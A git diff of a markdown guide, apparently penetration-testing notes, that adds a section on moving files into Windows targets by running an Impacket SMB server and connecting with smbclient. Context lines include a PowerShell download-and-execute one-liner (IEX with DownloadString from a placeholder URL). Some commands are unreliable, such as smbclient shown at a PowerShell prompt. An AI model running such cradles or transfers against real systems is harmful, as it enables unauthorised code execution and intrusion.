@@ -68,3 +68,37 @@ PS> IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
 PS> Invoke-WebRequest <Target File URL> -OutFile <Output File Name>
 ```
 ## SMB Downloads
+The **Server Message Block protocol (SMB protocol)** that runs on port **TCP/445** is common in enterprise networks where Windows services are running.
+
+In order to transfer files, we need to create an SMB server in our machine with *smbserver.py* from Impacket and then use **copy**, **move**, **PowerShell Copy-Item**, or any other tool that allows connection to SMB.
+
+### Step 1: Create the SMB Server
+We will be using **Impacket**, if you dont have it installed you can do that using this bash code:
+```bash
+$ sudo apt-get install python3-impacket
+```
+
+Once we have that installed we can move on to actually creating the smb server:
+```bash
+$ sudo impacket-smbserver <Share Name> -smb2support <Share Folder>
+```
+
+Example:
+```bash
+$ sudo impacket-smbserver sharefolder -smb2support /tmp/share
+```
+### Step 2: Copying a File from the SMB Server
+Log into the SMB server using smbclient:
+```powershell
+PS> smbclient \\<IP Adrress>\\<Share Name>
+```
+
+Example:
+```powershell
+PS> smbclient \\10.10.10.10\\sharefolder
+
+Password for [WORKGROUP\user]:
+Try "help" to get a list of possible commands.
+smb: \>
+```
+**Note:** in this case we did not specify a password so any password will be suffecient for accessing the files
